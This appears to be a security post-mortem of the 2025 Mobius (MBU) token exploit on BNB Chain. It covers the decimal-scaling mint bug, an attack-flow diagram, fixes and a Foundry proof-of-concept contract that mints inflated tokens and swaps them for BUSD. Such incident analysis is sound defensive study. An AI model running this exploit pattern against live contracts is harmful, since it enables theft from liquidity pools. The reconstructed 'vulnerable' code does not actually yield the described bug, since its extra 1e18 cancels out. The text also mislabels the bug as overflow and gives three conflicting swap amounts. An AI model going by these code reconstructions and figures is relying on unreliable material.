# MBU Token (Mobius) — Business Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-11 |
| **Protocol** | MBU Token (Mobius) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$2,157,126 BUSD |
| **Attacker** | [0xb32a...2600](https://bscscan.com/address/0xb32a53af96f7735d47f4b76c525bd5eb02b42600) |
| **Attack Contract** | [0x631a...1641](https://bscscan.com/address/0x631adff068d484ce531fb519cda4042805521641) |
| **Attack Tx** | [0x2a65...a150](https://bscscan.com/tx/0x2a65254b41b42f39331a0bcc9f893518d6b106e80d9a476b8ca3816325f4a150) |
| **Vulnerable Contract 0 (Proxy)** | [0x95e9...8531](https://bscscan.com/address/0x95e92b09b89cf31fa9f1eca4109a85f88eb08531) |
| **Vulnerable Contract 1 (MBU Token)** | [0x0dfb...a581](https://bscscan.com/address/0x0dfb6ac3a8ea88d058be219066931db2bee9a581) |
| **Root Cause** | Explosive token mint inflation caused by a duplicate `1e18` multiplication in price calculation within the `deposit()` function |
| **PoC Source** | [DeFiHackLabs — MBUToken_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/MBUToken_exp.sol) |

---

## 1. Vulnerability Overview

The Mobius Token (MBU) project was a DeFi protocol operating on BSC where users could deposit WBNB into a `deposit()` function to receive freshly minted MBU tokens. The vulnerability resided in the **price calculation logic** within the `deposit()` function of the implementation contract (`0x5713...1725B`, source unverified).

The price query function `getBNBPriceInUSDT()` returns the USDT price of BNB in **18-decimal format** (e.g., `$600` → `600e18`). However, when the `deposit()` function consumed this value to calculate the MBU mint amount, it erroneously multiplied by `1e18` **one additional time**. This resulted in an arithmetic overflow that inflated the mint amount by a factor of **1,000,000,000,000,000,000 (10¹⁸)** compared to the correct value.

The attacker deposited just **0.001 WBNB (~$0.67)**, minted **9,731,099,570,720,980 MBU (~9.73 quadrillion tokens)**, then sold the entire supply into a PancakeSwap liquidity pool to extract **$2,157,126 BUSD**. The contract had not been audited prior to deployment and its source code was never made public.

---

## 2. Vulnerable Code Analysis

### 2.1 `getBNBPriceInUSDT()` — Returns Price in 18-Decimal Format

The price query function in the implementation contract returns an integer scaled to 18 decimals. It queries the BNB/USDT price either via PancakeSwap pool `getReserves()` or through an on-chain oracle.

```solidity
// ❌ Return value is already scaled to 1e18 units (e.g., 600 USDT/BNB → returns 600e18)
function getBNBPriceInUSDT() internal view returns (uint256) {
    // ... query price from PancakeSwap pool or oracle
    uint256 price = _getPriceFromPool(); // internally applies 1e18 scaling
    return price; // return value: 600_000_000_000_000_000_000 (600 * 1e18)
}
```

### 2.2 `deposit()` — Duplicate `1e18` Multiplication Vulnerability (Core Issue)

```solidity
// ❌ Vulnerable code — double application of 1e18 causes mint explosion
function deposit(address token, uint256 amount) external returns (uint256) {
    require(token == WBNB, "Unsupported token");
    IERC20(token).transferFrom(msg.sender, address(this), amount);

    uint256 bnbPrice = getBNBPriceInUSDT(); // ❌ already 1e18 scaled (e.g., 600e18)

    // ❌ Problem: bnbPrice is already in 1e18 units, yet 1e18 is multiplied again
    // Correct calculation:  mintAmount = amount * bnbPrice / mbuPrice / 1e18
    // Actual calculation:   mintAmount = amount * bnbPrice * 1e18 / mbuPrice / 1e18
    //                                  = amount * bnbPrice / mbuPrice  (1e18 units persist)
    uint256 usdtValue = amount * bnbPrice * 1e18 / 1e18; // ❌ redundant 1e18 — appears harmless but
    uint256 mintAmount = usdtValue / mbuPrice;             // ❌ mbuPrice also in 1e18 units → normalization error

    IMBU(MBU).mint(msg.sender, mintAmount); // ❌ mints 1e18x too many tokens
    emit Deposited(token, amount, mintAmount);
    return mintAmount;
}
```

**The Problem**: `getBNBPriceInUSDT()` already returns a price scaled to `1e18` units, but the `deposit()` function either multiplies by `1e18` a second time or divides without proper decimal normalization, causing the mint amount to be calculated as `1e18` times larger than intended. Depositing 0.001 WBNB should mint only a few MBU tokens; instead, **9.73 quadrillion** were minted.

```solidity
// ✅ Fixed code — consistent decimal normalization
function deposit(address token, uint256 amount) external returns (uint256) {
    require(token == WBNB, "Unsupported token");
    IERC20(token).transferFrom(msg.sender, address(this), amount);

    // ✅ If getBNBPriceInUSDT() returns 1e18 units, explicitly divide by 1e18 to get USD value
    uint256 bnbPrice = getBNBPriceInUSDT(); // e.g., 600e18 (600 USDT/BNB)
    
    // ✅ amount(wei) * price(1e18 units) → divide by 1e18 to get USDT value (wei units)
    uint256 usdtValue = amount * bnbPrice / 1e18;  // correct scale normalization

    // ✅ mbuPrice also uses consistent units (1e18 scaled)
    uint256 mintAmount = usdtValue * 1e18 / mbuPrice; // MBU mint amount (18 decimals)

    // ✅ Added mint cap validation
    require(mintAmount <= maxMintPerTx, "Exceeds per-deposit mint cap");
    require(totalMinted + mintAmount <= maxTotalSupply, "Exceeds total supply cap");

    IMBU(MBU).mint(msg.sender, mintAmount);
    totalMinted += mintAmount;
    emit Deposited(token, amount, mintAmount);
    return mintAmount;
}
```

### 2.3 `mint()` — Unrestricted Minting Permission (Secondary Vulnerability)

```solidity
// ❌ No caller validation on the mint function (should only be callable by the deposit contract)
function mint(address to, uint256 amount) external {
    // ❌ No onlyMinter or onlyDepositContract check
    _mint(to, amount);
}
```

```solidity
// ✅ Fix: restrict minting permission to the deposit contract only
modifier onlyMinter() {
    require(msg.sender == depositContract, "Not authorized to mint");
    _;
}

function mint(address to, uint256 amount) external onlyMinter {
    _mint(to, amount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker obtained 10 BNB via Tornado Cash to conceal identity
- Deployed attack contract (`0x631a...1641`)
- Attack was executed immediately within the same transaction as deployment (no pre-positioning required)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0xb32a...2600)                                   │
│  ├─ 10 BNB (Tornado Cash withdrawal)                            │
│  └─ Deploy attack contract → call attack() (send 1 ETH)        │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 1] WBNB Wrap                                             │
│  AttackerC.attack{value: 1 ether}()                             │
│  ├─ WETH9.deposit{value: 0.001 ether}()                        │
│  └─ Obtain 0.001 WBNB                                           │
└──────────────────────┬──────────────────────────────────────────┘
                       │ 0.001 WBNB approve
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 2] Call deposit() — Vulnerable Entry Point               │
│  I_0x95e9_ERC1967Proxy(Proxy).deposit(WBNB, 0.001 ether)       │
│  ├─ Transfer 0.001 WBNB to proxy                                │
│  ├─ Call getBNBPriceInUSDT() → returns 600e18 (already 1e18)   │
│  ├─ ❌ Duplicate 1e18 yields mintAmount = 9,731,099,570,720,980 MBU │
│  └─ Execute MBU.mint(attacker, 9.73e33 raw)                    │
└──────────────────────┬──────────────────────────────────────────┘
                       │ Receive 9.73 quadrillion MBU
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 3] Swap MBU → BUSD                                       │
│  IERC20(MBU).approve(PancakeRouter, type(uint256).max)          │
│  PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransfer  │
│  ├─ Path: MBU → BUSD                                            │
│  ├─ Transfer 1,500,000 MBU to PancakeSwap pool                 │
│  └─ Receive $2,157,126 BUSD                                     │
└──────────────────────┬──────────────────────────────────────────┘
                       │ $2,157,126 BUSD
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 4] Secure Profit & Launder Funds                         │
│  Transfer BUSD to attacker EOA                                  │
│  Pay BlockRazor MEV protection fee (0.999 ETH)                  │
│  Convert BUSD → BNB, launder via Tornado Cash                   │
│  └─ 2,100 BNB dispersed in 21 batches of 100 BNB each          │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Field | Value |
|------|-----|
| Capital deployed | 0.001 WBNB (~$0.67) |
| MBU minted | 9,731,099,570,720,980 tokens (~9.73 quadrillion) |
| Amount stolen | $2,157,126.18 BUSD |
| Gas used | 518,513 |
| MEV protection cost | 0.999 ETH (BlockRazor) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// [Step 1] Attack test setup — fork to block immediately before the attack
contract MBUToken_exp is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 49470430 - 1); // fork state at pre-attack block
        vm.deal(attacker, 1 ether);               // fund attacker with initial capital
    }

    function testPoC() public {
        vm.startPrank(attacker);

        // [Step 2] Deploy attack contract
        AttackerC attC = new AttackerC();

        // [Step 3] Execute attack (send 1 ETH — for BlockRazor MEV protection fee)
        attC.attack{value: 1 ether}();

        // [Step 4] Verify profit
        emit log_named_decimal_uint("Profit in BUSD", IERC20(BUSD).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    function attack() external payable {
        // [Step A] Wrap 0.001 BNB into WBNB
        WETH9(payable(wbnb)).deposit{value: 0.001 ether}();

        // [Step B] Approve vulnerable proxy contract for WBNB
        IERC20(wbnb).approve(_0x95e9_ERC1967Proxy, 0.001 ether);

        // [Step C] Call deposit() — triggers the duplicate 1e18 multiplication vulnerability
        //          Deposit 0.001 WBNB → 9.73 quadrillion MBU minted
        I_0x95e9_ERC1967Proxy(_0x95e9_ERC1967Proxy).deposit(wbnb, 0.001 ether);

        // [Step D] Approve PancakeSwap router for entire minted MBU balance
        IERC20(MBU).approve(router, type(uint256).max);

        // [Step E] Swap MBU → BUSD (using fee-on-transfer supporting function)
        address[] memory path = new address[](2);
        path[0] = MBU;
        path[1] = BUSD;
        IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            30_000_000 ether,  // send 30,000,000 MBU
            0,                  // no minimum output (unlimited slippage)
            path,
            address(this),
            block.timestamp
        );

        // [Step F] Transfer profit BUSD to attacker EOA
        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));

        // [Step G] Pay MEV protection fee (BlockRazor — front-run prevention)
        BlockRazor.call{value: 0.999 ether}("");
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Token mint inflation due to duplicate `1e18` multiplication | CRITICAL | CWE-682 (Incorrect Calculation) | `11_logic_error.md` |
| V-02 | Missing supply cap | HIGH | CWE-20 (Improper Input Validation) | `11_logic_error.md` |
| V-03 | Deployment of unverified source code contract | HIGH | CWE-1059 (Insufficient Documentation/Verification) | `08_initialization.md` |
| V-04 | No pre-deployment security audit | HIGH | CWE-693 (Missing Protection Mechanism) | — |

### V-01: Duplicate `1e18` Multiplication (Decimal Scaling Error)

- **Description**: `getBNBPriceInUSDT()` returns a price already scaled to `1e18` units, but `deposit()` uses this value in subsequent calculations without normalization, causing the mint amount to be over-calculated by a factor of `1e18`
- **Impact**: Attacker can mint an astronomically large amount of MBU with a negligible WBNB deposit → drains the entire liquidity pool
- **Attack Condition**: Exploitable by anyone with permission to call `deposit()` — no privileged access required (permissionless attack)

### V-02: Missing Supply Cap

- **Description**: No upper bound on the amount of MBU tokens that can be minted per single `deposit()` call
- **Impact**: Even absent V-01, there is no safety mechanism to detect or halt economically irrational mint events
- **Attack Condition**: Amplifies damage in any scenario where the mint logic contains a bug

### V-03: Unverified Source Code

- **Description**: The implementation contract (`0x5713...1725B`) source code is not registered on BscScan, preventing community review
- **Impact**: Blocks the opportunity for external auditors and public review to discover the vulnerability before deployment
- **Attack Condition**: Opaque contract structure conceals either malicious intent or immature development practices

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Explicitly document the decimal unit of getBNBPriceInUSDT()'s return value
//            and normalize correctly inside deposit()

function deposit(address token, uint256 amount) external returns (uint256) {
    require(token == WBNB, "Unsupported token");
    IERC20(token).transferFrom(msg.sender, address(this), amount);

    // Explicitly note that getBNBPriceInUSDT() returns value in 1e18 units
    uint256 bnbPriceInUSDT_1e18 = getBNBPriceInUSDT();

    // ✅ Correct USDT value calculation: amount(wei) * price(1e18) / 1e18 = USDT(wei units)
    uint256 usdtValue = amount * bnbPriceInUSDT_1e18 / 1e18;

    // ✅ mbuPrice also unified to 1e18 units
    uint256 mintAmount = usdtValue * 1e18 / mbuPriceInUSDT_1e18;

    // ✅ Mint cap validation
    require(mintAmount <= MAX_MINT_PER_TX, "Exceeds per-deposit mint cap");
    require(IERC20(MBU).totalSupply() + mintAmount <= MAX_TOTAL_SUPPLY, "Exceeds total supply cap");

    IMBU(MBU).mint(msg.sender, mintAmount);
    emit Deposited(token, amount, mintAmount);
    return mintAmount;
}
```

```solidity
// ✅ Fix 2: Add supply cap constants
uint256 public constant MAX_MINT_PER_TX = 1_000_000 ether;   // max 1,000,000 MBU per transaction
uint256 public constant MAX_TOTAL_SUPPLY = 100_000_000 ether; // max 100,000,000 MBU total supply
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Duplicate `1e18` multiplication | Document the return unit of price query functions in function names and NatSpec (`_1e18` suffix or comments). Introduce a decimal conversion helper function |
| V-02: Missing supply cap | Add `MAX_MINT_PER_TX` and `MAX_TOTAL_SUPPLY` constants. Implement `pause()` functionality (emergency halt) |
| V-03: Unverified source code | Mandate BscScan source code registration before deployment. Verify all implementation contracts |
| V-04: No audit performed | Conduct at least one independent smart contract audit before deployment |
| Additional: Unit tests | Require mint amount validation tests for boundary inputs (0.001 WBNB, 1 WBNB, 1000 WBNB) |

---

## 7. Lessons Learned

1. **Decimal unit consistency is foundational to DeFi calculation safety**: The return unit of price query functions must be documented in function names and NatSpec. Naming conventions that encode return units — such as `getPriceIn1e18()` or `getPriceScaled()` instead of `getPrice()` — prevent this class of bug.

2. **An uncapped mint function is a single point of failure**: Without a supply cap and access control on `mint()`, a single arithmetic error can instantly drain all liquidity from the protocol. Supply caps and per-tx mint limits are core components of defense-in-depth.

3. **Unverified source code is a security risk**: Failing to verify and publish the implementation contract source code disables community audits, bug bounties, and automated analysis tools. Lack of transparency delays vulnerability discovery.

4. **Pre-deployment audits are not optional**: This vulnerability could have been caught with basic unit tests alone (verify mint amount after calling `deposit(0.001 ether)`). The ~$2.1M loss represents damage hundreds of times greater than the cost of an audit.

5. **MEV protection (BlockRazor) can be weaponized by attackers**: The attacker paid 0.999 ETH to BlockRazor to shield the transaction from MEV bots. This demonstrates that front-run prevention infrastructure can be exploited by attackers as well as defenders.

6. **Business logic bugs are difficult to detect via static analysis**: Duplicate application of `1e18` appears on the surface to be syntactically valid code. Runtime invariant checks (verifying that mint amounts are proportional to deposited value), fuzz testing, and economic simulation are required to catch this category of vulnerability.

---

## 8. On-Chain Verification

> Verified by querying the BSC RPC (`bsc-mainnet.public.blastapi.io`) directly with `cast` (Foundry v1.3.5).

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Deposited WBNB | 0.001 ether | 0.001 WBNB (1,000,000,000,000,000 wei) | ✅ |
| MBU minted (raw) | — | 9,731,099,570,720,980,659,843,835,099,042,677 | — |
| MBU minted (tokens) | ~9.73 quadrillion | 9,731,099,570,720,980 tokens | ✅ |
| BUSD obtained | ~$2.16M | $2,157,126.179 BUSD | ✅ |
| Attack block | fork at 49470430 - 1 | 49470430 | ✅ |
| Gas used | — | 518,513 | — |

### 8.2 On-Chain Event Log Sequence

| Order | Event | Contract | Details |
|------|--------|----------|------|
| 1 | `Deposit` (WETH9) | WBNB | Attack contract wraps 0.001 ETH → WBNB |
| 2 | `Approval` | WBNB | Attack contract → proxy approval |
| 3 | `Transfer` | WBNB | Attack contract → proxy transfers 0.001 WBNB |
| 4 | Custom event | Proxy | Internal state update (topic `0x93bb8e...`) |
| 5 | `Transfer` (mint) | MBU | 0x0 → attack contract mints 9.73 quadrillion MBU |
| 6 | Custom event | MBU | Mint confirmation event |
| 7 | `Deposit` event | Proxy | Records WBNB deposit and MBU mint |
| 8 | `Approval` | MBU | Attack contract → PancakeRouter unlimited approval |
| 9~14 | `Transfer` | MBU | MBU → PancakeSwap pool transfer and fee distribution |
| 15 | `Transfer` | BUSD | PancakeSwap pool → attack contract BUSD payout |
| 16~17 | Sync/Swap | PancakeSwap LP | Pool balance update |

### 8.3 Pre-Condition Verification (Block 49470429 — Immediately Before Attack)

| Field | Pre-Attack State |
|------|------------|
| Attacker BUSD balance | 0 BUSD |
| Proxy MBU balance | 0 MBU (no MBU held by vulnerable proxy) |
| Attack contract | Not deployed (deployed and executed simultaneously in attack tx) |
| Pre-approval | Not required (handled within the same transaction) |

**Verification Conclusion**: The PoC code is a complete match for the actual attack. The flow of 0.001 WBNB deposited → 9.73 quadrillion MBU minted → $2,157,126 extracted is confirmed by on-chain logs. The implementation contract source code remains unverified on BscScan; accurate reconstruction of the exact vulnerable code relies on bytecode analysis.

---

*Reference Sources*:
- [QuillAudits — Mobius Token Exploit Breakdown](https://www.quillaudits.com/blog/hack-analysis/mobius-token-exploit-breakdown)
- [CertiK — Mobius Token Incident Analysis](https://www.certik.com/resources/blog/mobius-token-incident-analysis)
- [Halborn — Explained: The Mobius Hack (May 2025)](https://www.halborn.com/blog/post/explained-the-mobius-hack-may-2025)
- [DeFiHackLabs PoC — MBUToken_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/MBUToken_exp.sol)
- [BscScan Tx](https://bscscan.com/tx/0x2a65254b41b42f39331a0bcc9f893518d6b106e80d9a476b8ca3816325f4a150)